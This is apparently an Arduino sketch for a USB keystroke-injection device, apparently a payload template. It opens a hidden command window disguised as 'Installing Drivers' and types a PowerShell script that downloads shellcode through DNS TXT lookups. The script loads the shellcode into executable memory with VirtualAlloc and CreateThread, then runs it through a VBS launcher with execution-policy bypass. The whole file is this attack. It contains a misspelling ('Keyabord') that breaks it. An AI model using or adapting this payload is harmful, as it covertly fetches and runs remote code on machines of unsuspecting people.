void setup(){
  Keyabord.begin();
}
void loop(){
  delay(3000);
  wait_for_drivers(2000);

  minimise_windows();
  delay(500);
  while(!cmd(3,500,"cmd /T:01 /K \"@echo off && mode con:COLS=15 LINES=1 && title Installing Drivers\""))
  {
  reset_windows_desktop(2000);
  }

  Keyboard.println(F("echo $co = (iex \"nslookup -querytype=txt INPUT0\")  > %temp%\\dce.ps1"));
  
  Keyboard.println(F("echo $t = $co ^| select-string -pattern ^\"`^\"^\" >> %temp%\\dce.ps1"));
  
  Keyboard.println(F("echo $t1 = $t -split(^\"`^\"^\")[0] >> %temp%\\dce.ps1"));
  Keyboard.println(F("echo [string]$s = $t1 -replace \"`t\", \"\" >> %temp%\\dce.ps1"));
  Keyboard.println(F("echo $s = $s.replace(\" \", \"\") >> %temp%\\dce.ps1"));
  Keyboard.println(F("echo [Byte[]]$sc32 = $s -split ',' >> %temp%\\dce.ps1"));
  Keyboard.println(F("echo $co64 = (iex \"nslookup -querytype=txt INPUT1\")  >> %temp%\\dce.ps1"));
  Keyboard.println(F("echo $t64 = $co64 ^| select-string -pattern ^\"`^\"^\" >> %temp%\\dce.ps1"));
  Keyboard.println(F("echo $t164 = $t64 -split(^\"`^\"^\")[0] >> %temp%\\dce.ps1"));
  Keyboard.println(F("echo [string]$s64 = $t164 -replace \"`t\", \"\" >> %temp%\\dce.ps1"));
  Keyboard.println(F("echo $s64 = $s64.replace(\" \", \"\") >> %temp%\\dce.ps1"));
  Keyboard.println(F("echo [Byte[]]$sc64 = $s64 -split ',' >> %temp%\\dce.ps1"));
  
  Keyboard.println(F("echo $co = @' >> %temp%\\dce.ps1"));
  Keyboard.println(F("echo [DllImport(\"kernel32.dll\")] >> %temp%\\dce.ps1"));
  Keyboard.println(F("echo public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect); >> %temp%\\dce.ps1"));
  Keyboard.println(F("echo [DllImport(\"kernel32.dll\")] >> %temp%\\dce.ps1"));
  Keyboard.println(F("echo public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId); >> %temp%\\dce.ps1"));
  Keyboard.println(F("echo [DllImport(\"msvcrt.dll\")] >> %temp%\\dce.ps1"));
  Keyboard.println(F("echo public static extern IntPtr memset(IntPtr dest, uint src, uint count); >> %temp%\\dce.ps1"));
  Keyboard.println(F("echo '@ >> %temp%\\dce.ps1"));
  Keyboard.println(F("echo $winFunc = Add-Type -memberDefinition $co -Name \"Win32\" -namespace Win32Functions -passthru >> %temp%\\dce.ps1"));

  Keyboard.println(F("echo [Byte[]]$sc = $sc32 >> %temp%\\dce.ps1"));
  Keyboard.println(F("echo if ([IntPtr]::Size -eq 8) {$sc = $sc64} >> %temp%\\dce.ps1"));
  
  Keyboard.println(F("echo $size = 0x1000 >> %temp%\\dce.ps1"));
  Keyboard.println(F("echo if ($sc.Length -gt 0x1000) {$size = $sc.Length} >> %temp%\\dce.ps1"));
  Keyboard.println(F("echo $x=$winFunc::VirtualAlloc(0,0x1000,$size,0x40) >> %temp%\\dce.ps1"));
  Keyboard.println(F("echo for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)} >> %temp%\\dce.ps1"));
  Keyboard.println(F("echo $winFunc::CreateThread(0,0,$x,0,0,0) >> %temp%\\dce.ps1"));

  Keyboard.println(F("echo Set oShell = CreateObject(\"WScript.Shell\") > %temp%\\dce.vbs"));
  Keyboard.println(F("echo oShell.Run(\"powershell.exe -ep bypass -nologo -c %temp%\\dce.ps1\"),0,true >> %temp%\\dce.vbs"));
  delay(1000);
  Keyboard.println(F("wscript %temp%\\dce.vbs"));
  delay(1000);
  Keyboard.println(F("exit"));
  while(true){};
}

DEFS
